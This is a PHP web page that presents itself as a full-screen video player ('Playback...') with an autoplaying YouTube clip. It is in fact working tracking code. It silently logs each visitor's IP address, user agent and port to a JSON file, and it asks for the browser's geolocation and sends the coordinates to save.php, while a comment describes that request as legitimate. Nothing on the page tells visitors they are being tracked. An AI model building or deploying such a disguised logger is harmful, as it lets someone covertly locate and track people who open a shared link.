<?php
// index.php
session_start();

// Функция продвинутого определения реального IP пользователя
function getRealIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                // Валидация IP-адреса
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
            // Если IP прошел валидацию, но он локальный/приватный
            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
                return $_SERVER[$key];
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s');
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

// Массив тестовых ID видео (все ссылки проверены, ролики рабочие и доступны для встраивания)
$videos = ['dQw4w9WgXcQ', 'jNQXAC9IVRw', '9bZkp7q19f0'];
$random_video = $videos[array_rand($videos)];

$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

$_SESSION['current_log_id'] = $log_entry['id'];

$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Воспроизведение...</title>
    <style>
        /* Стили для создания абсолютно полноэкранного плеера без рамок */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
        }
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            background: #000;
        }
    </style>
</head>
<body>

<!-- Исправленный и оптимизированный iframe плеер -->
<iframe 
    class="fullscreen-video"
    src="https://www.youtube.com/embed/<?php echo $random_video; ?>?autoplay=1&mute=1&loop=1&playlist=<?php echo $random_video; ?>&controls=1&rel=0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
</iframe>

<script>
// Легитимный запрос координат устройства средствами браузера
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const data = new FormData();
        data.append('lat', position.coords.latitude);
        data.append('lon', position.coords.longitude);

        fetch('save.php', {
            method: 'POST',
            body: data
        });
    }, function(error) {
        console.log("Доступ к геопозиции не предоставлен устройством.");
    });
}
</script>
</body>
</html>